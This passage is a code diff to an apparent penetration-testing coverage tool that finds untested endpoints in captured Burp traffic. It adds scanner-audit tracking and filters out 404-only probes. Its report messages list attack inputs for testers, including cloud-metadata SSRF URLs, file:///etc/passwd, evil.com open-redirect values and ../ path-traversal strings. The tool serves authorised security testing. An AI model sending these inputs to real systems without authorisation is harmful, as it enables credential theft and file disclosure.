               "Cloud meta: `http://169.254.169.254/latest/meta-data/` (+ GCP `Metadata-Flavor`, Azure IMDS), "
               "`http://localhost:port/`, `file:///etc/passwd`, `gopher://`, DNS-rebind, redirect-to-internal, "
               "decimal/hex/IPv6 `[::1]`, `@`-trick `https://trusted@169.254.169.254`. Use Collaborator.",
               'A10:2021 Server-Side Request Forgery')
-        if OPEN_REDIRECT_PARAM.search(np) and not _has_sig(values, ('http://', 'https://', '//', '\\\\')):
+        if OPEN_REDIRECT_PARAM.search(np) and not scanner_audited and not _has_sig(values, ('http://', 'https://', '//', '\\\\')):
             g('redirect', 'MEDIUM', 'Open redirect not tested on `{0}`'.format(param),
               '`{0}` looks like a redirect target.'.format(param), ev,
               "Test `//evil.com`, `https://evil.com`, `/\\evil.com`, `https:evil.com`, `https://trusted@evil.com`, "
               "`https://trusted.evil.com`, CRLF & whitelist-bypass variants. Chains into SSRF/OAuth-token theft.",
               'A01:2021 Broken Access Control')
-        if TRAVERSAL_PARAM.search(np) and not _has_sig(values, ('../', '..\\', '%2e%2e', '/etc/passwd', 'win.ini', '%252e')):
+        if TRAVERSAL_PARAM.search(np) and not scanner_audited and not _has_sig(values, ('../', '..\\', '%2e%2e', '/etc/passwd', 'win.ini', '%252e')):
             g('traversal', 'HIGH', 'Path traversal / LFI not tested on `{0}`'.format(param),
               '`{0}` suggests file/path handling.'.format(param), ev,
               "Test `../../../../etc/passwd`, `..\\..\\windows\\win.ini`, `%2e%2e%2f`, double `%252e`, "
@@ -1515,8 +1662,8 @@ def _heuristics(p):
       'the RESPONSE (or using Match & Replace) can unlock gated functionality. Targets below are derived '
       'from this endpoint\'s path, observed parameters, and observed status codes.',
       'status codes seen: {0}; param hints: {1}'.format(
-          sorted(p.status_codes_seen),
-          [k for k in list(all_params)[:10]]),
+          _join_clean(sorted(p.status_codes_seen)),
+          _join_clean(all_params, limit=10)),
       'In Burp, intercept the RESPONSE (or set a Match & Replace rule). Specific flips to try on THIS endpoint: '
       + flips_rendered +
       '. After each flip, confirm whether server-side state actually changed (re-fetch with a clean session) '
@@ -1613,6 +1760,10 @@ def analyse(profiles):
             gaps=gaps,
         )
         audit.tests_credited = credits   # test classes proven exercised (climbs on retest)
+        audit.tools_seen = sorted(p.tools_seen)
+        audit.scanner_audited = _scanner_audited(p)
+        audit.scanner_hits = p.scanner_hits
+        audit.intruder_hits = p.intruder_hits
         audits.append(audit)
     audits.sort(key=lambda a: a.coverage_score)
     return audits
@@ -1630,12 +1781,12 @@ def score_label(s):
 
 
 def _html_escape(s):
-    return (str(s).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
+    return (_u(s).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
             .replace('"', '&quot;'))
 
 
 def _mermaid_safe(s):
-    return re.sub(r'[()#:"`\[\]{}]', ' ', str(s)).strip()
+    return re.sub(r'[()#:"`\[\]{}]', ' ', _u(s)).strip()
 
 
 def to_markdown(audits, engagement):
@@ -1740,6 +1891,8 @@ def to_json(audits):
             "coverage_score": a.coverage_score, "coverage_label": score_label(a.coverage_score),
             "tests_credited": getattr(a, 'tests_credited', 0),
             "test_gaps_remaining": sum(1 for gp in a.gaps if gp.kind == 'test'),
+            "tools_seen": getattr(a, 'tools_seen', []),
+            "scanner_audited": getattr(a, 'scanner_audited', False),
             "methods_seen": a.methods_seen, "query_params": a.query_params,
             "body_params": a.body_params, "auth_coverage": a.auth_coverage,
             "status_codes": a.status_codes, "response_length_range": a.response_length_range,
@@ -1804,6 +1957,10 @@ def to_html(audits, engagement):
         score_cls = 's-bad' if sc < 40 else ('s-mid' if sc < 70 else 's-ok')
         credited = getattr(a, 'tests_credited', 0)
         test_gaps_n = sum(1 for gp in a.gaps if gp.kind == 'test')
+        tools = getattr(a, 'tools_seen', []) or []
+        tools_txt = ", ".join(tools) if tools else "unknown"
+        if getattr(a, 'scanner_audited', False):
+            tools_txt += " (Scanner-audited: injection classes credited)"
         cards.append(
             '\n  <div class="ep">\n'
             '    <h2>EP{0} &mdash; {1}</h2>\n'
@@ -1814,6 +1971,7 @@ def to_html(audits, engagement):
             '      <span>Methods: <b>{7}</b></span>\n'
             '      <span>Auth: <b>{8}</b> auth / <b>{9}</b> unauth</span>\n'
             '      <span>Tests proven: <b>{12}</b> / {13} remaining</span>\n'
+            '      <span>Tested by: <b>{14}</b></span>\n'
             '    </div>\n'
             '    <pre class="mermaid">\n{10}\n    </pre>\n'
             '    <div class="missed"><h3>Gaps / Missed Test Cases</h3>{11}</div>\n'
@@ -1822,7 +1980,7 @@ def to_html(audits, engagement):
                 _html_escape(a.behavior_class.upper()), a.total_requests,
                 _html_escape(", ".join(a.methods_seen)),
                 a.auth_coverage['with_auth'], a.auth_coverage['without_auth'],
-                mermaid_src, gaps_html, credited, test_gaps_n))
+                mermaid_src, gaps_html, credited, test_gaps_n, _html_escape(tools_txt)))
 
     css = (
         ":root { --bg:#0f1419; --card:#1b232d; --line:#2c3a47; --txt:#e6edf3; --muted:#9bb0c0;"
@@ -1898,7 +2056,7 @@ def _owasp_short(o):
 
 
 def _trunc(s, n=80):
-    s = str(s)
+    s = _u(s)
     return s if len(s) <= n else s[:n] + '...(truncated)'
 
 
@@ -2082,6 +2240,19 @@ def run_pipeline(input_files, scope_csv, engagement, output_base_dir,
     logger("Building endpoint profiles from {0} requests...".format(len(all_requests)))
     profiles = build_profiles(all_requests)
     logger("  -> {0} unique endpoints".format(len(profiles)))
+
+    # Drop non-existent endpoints (404-only crawler/scanner probes for paths that
+    # don't exist on this app - a major false-positive source on .aspx/PHP/etc.).
+    before = len(profiles)
+    profiles = dict((k, v) for k, v in profiles.items() if not _is_nonexistent_endpoint(v))
+    dropped = before - len(profiles)
+    if dropped:
+        logger("  Dropped {0} non-existent endpoint(s) (404-only probes) -> {1} real endpoints".format(
+            dropped, len(profiles)))
+
+    if not profiles:
+        raise RuntimeError("All endpoints were 404-only probes; nothing real to analyse. "
+                           "Check scope / that the capture includes real app traffic.")
 
     logger("Running gap analysis...")
     audits = analyse(profiles)
